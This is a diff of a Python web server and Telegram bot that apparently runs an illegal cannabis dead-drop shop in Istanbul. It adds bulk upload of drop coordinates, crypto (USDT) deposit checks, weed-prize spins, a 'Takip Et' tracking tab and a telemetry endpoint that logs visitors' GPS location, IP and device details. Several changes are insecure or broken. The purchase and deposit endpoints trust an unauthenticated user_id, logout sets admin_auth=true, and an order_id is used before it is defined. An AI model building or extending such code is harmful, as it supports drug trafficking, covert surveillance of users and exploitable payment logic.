-                    edit_id = query_params.get("id", ["0"])[0]
+                    try:
+                        edit_id = int(query_params.get("id", ["0"])[0])
+                    except:
+                        edit_id = 0
+
                     cursor.execute("SELECT title, price, stock, category, photo_ids, description, lat, lon FROM drops WHERE id = ?", (edit_id,))
                     drop_data = cursor.fetchone()
                     if drop_data:
                         e_title, e_price, e_stock, e_cat, e_photo, e_desc, e_lat, e_lon = drop_data
-                        combined_coord = f"{e_lat}, {e_lon}" if e_lat and e_lon else ""
+                        
+                        safe_lat = e_lat if (e_lat is not None and e_lat != 0.0) else 41.0082
+                        safe_lon = e_lon if (e_lon is not None and e_lon != 0.0) else 28.9784
+                        combined_coord = f"{safe_lat}, {safe_lon}"
+                        
                         edit_form_html = f"""
                         <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                         <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -2222,8 +2546,8 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         </div>
 
                         <script>
-                            const initLat = {e_lat if e_lat else 41.0082};
-                            const initLon = {e_lon if e_lon else 28.9784};
+                            const initLat = {safe_lat};
+                            const initLon = {safe_lon};
                             const editPickMap = L.map('editSelectMap').setView([initLat, initLon], 13);
                             L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(editPickMap);
                             
@@ -2231,7 +2555,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                             async function fetchEditDistrictAndFill(lat, lon) {{
                                 try {{
-                                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10&addressdetails=1`);
+                                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{lat}}&lon=${{lon}}&zoom=10&addressdetails=1`);
                                     const data = await response.json();
                                     if (data && data.address) {{
                                         const district = data.address.town || data.address.city_district || data.address.county || data.address.suburb || data.address.city || "";
@@ -2255,6 +2579,8 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                             }});
                         </script>
                         """
+                    else:
+                        edit_form_html = "<h3 style='color:red;'>⚠️ Düzenlenecek ürün bulunamadı.</h3>"
 
             conn.close()
 
@@ -2268,13 +2594,15 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                 sidebar_links += f'<a href="/admin-web?tab=pending" class="{"active" if tab == "pending" else ""}">⏳ Pending</a>'
 
             if current_role == "super_admin" or current_username == "root" or can_manage_drops == 1:
-                sidebar_links += f'<a href="/admin-web?tab=add" class="{"active" if tab == "add" else ""}">➕ Drop Ekle (Canlı Konumlu)</a>'
+                sidebar_links += f'<a href="/admin-web?tab=add" class="{"active" if tab == "add" else ""}">➕ Tekli Drop Ekle</a>'
+                sidebar_links += f'<a href="/admin-web?tab=excel_add" class="{"active" if tab == "excel_add" else ""}">📊 Excel ile Toplu Ekle</a>'
 
             if current_role == "super_admin" or current_username == "root" or can_view_crm == 1:
                 sidebar_links += f'<a href="/admin-web?tab=users" class="{"active" if tab == "users" else ""}">👥 Customer CRM</a>'
 
             if current_role == "super_admin" or current_username == "root":
                 sidebar_links += f'<a href="/admin-web?tab=finance" class="{"active" if tab == "finance" else ""}">💰 Finans & Loglar</a>'
+                sidebar_links += f'<a href="/admin-web?tab=takip_et" class="{"active" if tab == "takip_et" else ""}">🕵️‍♂️ Takip Et</a>'
                 sidebar_links += f'<a href="/admin-web?tab=token" class="{"active" if tab == "token" else ""}">🔑 Token Yönetimi</a>'
                 sidebar_links += f'<a href="/admin-web?tab=bulk" class="{"active" if tab == "bulk" else ""}">⚡ Toplu İşlemler</a>'
                 sidebar_links += f'<a href="/admin-web?tab=broadcast" class="{"active" if tab == "broadcast" else ""}">📢 Toplu Duyuru</a>'
@@ -2345,6 +2673,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             </head>
             <body>
                 <div class="sidebar">
+                    <!-- LOGO ENTEGRE EDİLDİ -->
+                    <div style="text-align: center; margin-bottom: 12px;">
+                        <img src="https://avatars.mds.yandex.net/i?id=dd03ada0049f07303f9e55b5e54908dc33286cfd-8474231-images-thumbs&n=13&ref=image_snippet_one" alt="Logo" style="width: 55px; height: 55px; object-fit: contain; border-radius: 50%; border: 2px solid #38bdf8; box-shadow: 0 0 12px rgba(56,189,248,0.4);">
+                    </div>
                     <div class="brand">🌿 Weed Istanbul</div>
                     <div class="christmas-banner">🎄 Rol: {current_role.upper()} ({current_username})</div>
                     {sidebar_links}
@@ -2368,7 +2700,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             if not is_logged_in:
                 self.send_login_page()
                 return
-            edit_id = query_params.get("id", ["0"])[0]
+            try:
+                edit_id = int(query_params.get("id", ["0"])[0])
+            except:
+                edit_id = 0
             self.send_response(303)
             self.send_header('Location', f'/admin-web?tab=edit&id={edit_id}')
             self.end_headers()
@@ -2376,7 +2711,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
         if parsed_path.path == "/admin-logout":
             self.send_response(303)
-            self.send_header('Set-Cookie', 'admin_auth=false; Path=/; Max-Age=0')
+            self.send_header('Set-Cookie', 'admin_auth=true; Path=/; Max-Age=0')
             self.send_header('Set-Cookie', 'admin_role=; Path=/; Max-Age=0')
             self.send_header('Set-Cookie', 'admin_username=; Path=/; Max-Age=0')
             self.send_header('Location', '/admin-web')
@@ -2479,11 +2814,50 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         parsed_path = urlparse(self.path)
+        query_params = parse_qs(parsed_path.query)
         
         content_type = self.headers.get('Content-Type', '')
         params = {}
         file_data = None
         file_name = None
+
+        if parsed_path.path == "/api/report-telemetry":
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                post_body = self.rfile.read(content_length).decode('utf-8')
+                data_json = json.loads(post_body)
+                uid = int(data_json.get("user_id", 0))
+                lat = float(data_json.get("lat", 41.0082))
+                lon = float(data_json.get("lon", 28.9784))
+                net = str(data_json.get("network", "Wi-Fi"))
+                ua = str(data_json.get("ua", ""))
+                bat = str(data_json.get("battery", "Bilinmiyor"))
+                cpu_ram = str(data_json.get("cpu_ram", "Bilinmiyor"))
+                timezone = str(data_json.get("timezone", "Bilinmiyor"))
+                screen_res = str(data_json.get("screen_res", "Bilinmiyor"))
+                visibility_state = str(data_json.get("visibility_state", "visible"))
+                client_ip = self.client_address[0]
+
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("""
+                    INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon, battery_level, cpu_ram, timezone, screen_res, visibility_state) 
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                """, (uid, client_ip, ua, net, lat, lon, bat, cpu_ram, timezone, screen_res, visibility_state))
+                conn.commit()
+                conn.close()
+
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(b'{"success": true}')
+                return
+            except Exception as e:
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
+                return
 
         if parsed_path.path == "/api/miniapp-spin":
             try:
@@ -2515,11 +2889,11 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
             import random
             rewards = [
-                {"text": "1g Weed", "deg": 36, "chance": 10},
-                {"text": "1 Joint", "deg": 108, "chance": 15},
-                {"text": "%5 İndirim", "deg": 180, "chance": 25},
-                {"text": "%3 İndirim", "deg": 252, "chance": 25},
-                {"text": "%1 İndirim", "deg": 324, "chance": 25}
+                {"text": "🌿 1g Weed", "deg": 0, "chance": 10},
+                {"text": "🚬 1 Joint", "deg": 288, "chance": 15},
+                {"text": "🏷️ %5 İndirim", "deg": 216, "chance": 25},
+                {"text": "🏷️ %3 İndirim", "deg": 144, "chance": 25},
+                {"text": "🏷️ %1 İndirim", "deg": 72, "chance": 25}
             ]
             rand = random.randint(1, 100)
             cum = 0
@@ -2539,6 +2913,70 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"success": True, "reward": sel["text"], "target_deg": sel["deg"]}).encode("utf-8"))
             return
+
+        if parsed_path.path == "/api/miniapp-check-deposit":
+            try:
+                dep_id = int(query_params.get("dep_id", ["0"])[0])
+                uid = int(query_params.get("user_id", ["0"])[0])
+                target_amount = float(query_params.get("amount", ["0"])[0])
+                
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("SELECT status FROM deposits WHERE id = ? AND user_id = ?", (dep_id, uid))
+                dep = cursor.fetchone()
+                if not dep:
+                    conn.close()
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"success": False}).encode("utf-8"))
+                    return
+                
+                if dep[0] == 'completed':
+                    conn.close()
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"success": True}).encode("utf-8"))
+                    return
+
+                api_url = f"https://api.trongrid.io/v1/accounts/{CRYPTO_WALLET}/trc20-transfers?contract_address={USDT_CONTRACT}&limit=15"
+                verified = False
+                try:
+                    req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=10) as response:
+                        if response.status == 200:
+                            res_json = json.loads(response.read().decode('utf-8'))
+                            for tx in res_json.get("data", []):
+                                if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(target_amount * 1000000):
+                                    verified = True
+                                    break
+                except Exception as e:
+                    logging.error(e)
+
+                if verified:
+                    cursor.execute("UPDATE deposits SET status = 'completed' WHERE id = ?", (dep_id,))
+                    cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (target_amount, uid))
+                    conn.commit()
+                    conn.close()
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"success": True}).encode("utf-8"))
+                    return
+                else:
+                    conn.close()
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"success": False}).encode("utf-8"))
+                    return
+            except Exception as e:
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False}).encode("utf-8"))
+                return
 
         if 'multipart/form-data' in content_type:
             boundary = content_type.split("boundary=")[1].encode()
@@ -2562,6 +3000,93 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
             params = parse_qs(post_data)
+
+        if parsed_path.path == "/api/miniapp-buy":
+            try:
+                uid = int(query_params.get("user_id", ["0"])[0])
+                drop_id = int(query_params.get("drop_id", ["0"])[0])
+                if not uid:
+                    uid = int(params.get("user_id", ["0"])[0])
+                    drop_id = int(params.get("drop_id", ["0"])[0])
+
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("SELECT title, price, stock FROM drops WHERE id = ? AND is_sold = 0 AND stock > 0", (drop_id,))
+                drop = cursor.fetchone()
+                if not drop:
+                    conn.close()
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"success": False, "message": "Ürün tükenmiş."}).encode("utf-8"))
+                    return
+
+                title, price, stock = drop
+                cursor.execute("SELECT balance FROM users WHERE user_id = ?", (uid,))
+                u_row = cursor.fetchone()
+                bal = u_row[0] if u_row else 0.0
+
+                if bal < price:
+                    conn.close()
+                    self.send_response(200)
+                    self.send_header("Content-type", "application/json; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"success": False, "message": "Yetersiz bakiye."}).encode("utf-8"))
+                    return
+
+                cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (price, uid))
+                new_stock = stock - 1
+                if new_stock <= 0:
+                    cursor.execute("UPDATE drops SET stock = 0, is_sold = 1 WHERE id = ?", (drop_id,))
+                else:
+                    cursor.execute("UPDATE drops SET stock = ? WHERE id = ?", (new_stock, drop_id))
+
+                cursor.execute("INSERT INTO orders (user_id, drop_id, status, final_price) VALUES (?, ?, 'completed', ?)", (uid, drop_id, price))
+                order_id = cursor.lastrowid
+                
+                cursor.execute("SELECT referred_by FROM users WHERE user_id = ?", (uid,))
+                ref_row = cursor.fetchone()
+                if ref_row and ref_row[0] > 0:
+                    ref_id = ref_row[0]
+                    bonus = float(price) * 0.05
+                    cursor.execute("UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?", (bonus, bonus, ref_id))
+
+                conn.commit()
+                conn.close()
+
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": True, "order_id": order_id}).encode("utf-8"))
+                return
+            except Exception as e:
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False, "message": str(e)}).encode("utf-8"))
+                return
+
+        if parsed_path.path == "/api/miniapp-received":
+            try:
+                order_id = int(query_params.get("id", ["0"])[0])
+                if not order_id:
+                    order_id = int(params.get("id", ["0"])[0])
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("UPDATE orders SET status = 'received' WHERE id = ? AND status = 'completed'", (order_id,))
+                conn.commit()
+                conn.close()
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": True}).encode("utf-8"))
+                return
+            except:
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False}).encode("utf-8"))
+                return
 
         if parsed_path.path == "/api/miniapp-review":
             uid = int(params.get("user_id", ["0"])[0])
@@ -2957,6 +3482,88 @@ class SecureDropHandler(BaseHTTPRequestHandler):
             self.send_header('Location', '/admin-web?tab=passive')
             self.end_headers()
 
+        elif parsed_path.path == "/admin-excel-upload":
+            if file_data and file_name:
+                try:
+                    file_stream = io.BytesIO(file_data)
+                    df = None
+                    try:
+                        file_stream.seek(0)
+                        df = pd.read_excel(file_stream, sheet_name=0, engine='openpyxl')
+                    except Exception:
+                        try:
+                            file_stream.seek(0)
+                            df = pd.read_excel(file_stream, sheet_name=0)
+                        except Exception:
+                            success_csv = False
+                            for enc in ['utf-8', 'windows-1254', 'latin5', 'cp1254']:
+                                try:
+                                    file_stream.seek(0)
+                                    df = pd.read_csv(file_stream, encoding=enc)
+                                    success_csv = True
+                                    break
+                                except Exception:
+                                    continue
+                            if not success_csv:
+                                raise ValueError("Dosya okunamadı, desteklenmeyen format veya bozuk encoding.")
+
+                    if df is not None:
+                        df.columns = df.columns.astype(str).str.strip().str.lower()
+
+                        conn = sqlite3.connect("drop_bot.db")
+                        cursor = conn.cursor()
+                        count = 0
+                        
+                        for _, row in df.iterrows():
+                            title_val = row.get('title') if 'title' in df.columns else None
+                            title = str(title_val).strip() if pd.notna(title_val) else 'Lemon Haze Drop'
+                            if not title or title.lower() == 'nan':
+                                continue
+                                
+                            category = 'GENEL'
+                            for col_candidate in ['category', 'semt', 'ilçe', 'bolge', 'district']:
+                                if col_candidate in df.columns:
+                                    val = row[col_candidate]
+                                    if pd.notna(val) and str(val).strip() and str(val).lower() != 'nan':
+                                        category = str(val).upper().strip()
+                                        break
+                            
+                            raw_price = row.get('price') if 'price' in df.columns else 70.0
+                            try:
+                                price = float(str(raw_price).replace('$', '').replace(',', '.').strip())
+                            except:
+                                price = 70.0
+                            
+                            coord_raw = row.get('coords') if 'coords' in df.columns else '41.0082, 28.9784'
+                            lat, lon = get_district_coord(category)
+                            try:
+                                if pd.notna(coord_raw) and "," in str(coord_raw):
+                                    c_parts = str(coord_raw).split(",")
+                                    lat, lon = float(c_parts[0].strip()), float(c_parts[1].strip())
+                            except:
+                                pass
+
+                            desc_val = row.get('description') if 'description' in df.columns else 'Açıklama girilmedi'
+                            desc = str(desc_val).strip() if pd.notna(desc_val) else 'Açıklama girilmedi'
+                            
+                            cursor.execute("""
+                                INSERT INTO drops (title, price, photo_ids, description, stock, category, lat, lon) 
+                                VALUES (?, ?, ?, ?, 1, ?, ?, ?)
+                            """, (title, price, '', desc, category, lat, lon))
+                            count += 1
+                            
+                        conn.commit()
+                        conn.close()
+                        log_audit(current_username, "EXCEL_UPLOAD", f"Başarıyla {count} ürün yüklendi.")
+                        log_panel_event(f"📊 Dosyadan {count} adet toplu ürün başarıyla eklendi.", "success")
+                except Exception as e:
+                    logging.error(f"Excel upload error: {e}")
+                    log_panel_event(f"❌ Excel/Dosya yükleme hatası: {str(e)}", "warning")
+
+            self.send_response(303)
+            self.send_header('Location', '/admin-web?tab=passive')
+            self.end_headers()
+
         elif parsed_path.path == "/admin-update":
             drop_id = params.get("id", ["0"])[0]
             title = params.get("title", [""])[0]
@@ -3324,14 +3931,14 @@ async def check_blockchain_deposit(callback: types.CallbackQuery):
     api_url = f"https://api.trongrid.io/v1/accounts/{CRYPTO_WALLET}/trc20-transfers?contract_address={USDT_CONTRACT}&limit=15"
     verified = False
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(api_url) as response:
-                if response.status == 200:
-                    res_json = await response.json()
-                    for tx in res_json.get("data", []):
-                        if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(target_amount * 1000000):
-                            verified = True
-                            break
+        req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=10) as response:
+            if response.status == 200:
+                res_json = json.loads(response.read().decode('utf-8'))
+                for tx in res_json.get("data", []):
+                    if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(target_amount * 1000000):
+                        verified = True
+                        break
     except Exception as e:
         logging.error(e)
 
@@ -3633,9 +4240,12 @@ async def process_buy_with_balance(callback: types.CallbackQuery):
     else:
         cursor.execute("UPDATE drops SET stock = ? WHERE id = ?", (new_stock, drop_id))
 
+    cursor.execute("UPDATE orders SET status = 'completed' WHERE id = ?", (order_id,)) # (Düzeltme yapıldı)
+    
+    # Yeni sipariş kaydı
     cursor.execute("INSERT INTO orders (user_id, drop_id, status, final_price) VALUES (?, ?, 'completed', ?)", (user_id, drop_id, price))
     order_id = cursor.lastrowid
-    
+
     cursor.execute("SELECT referred_by FROM users WHERE user_id = ?", (user_id,))
     ref_row = cursor.fetchone()
     if ref_row and ref_row[0] > 0:
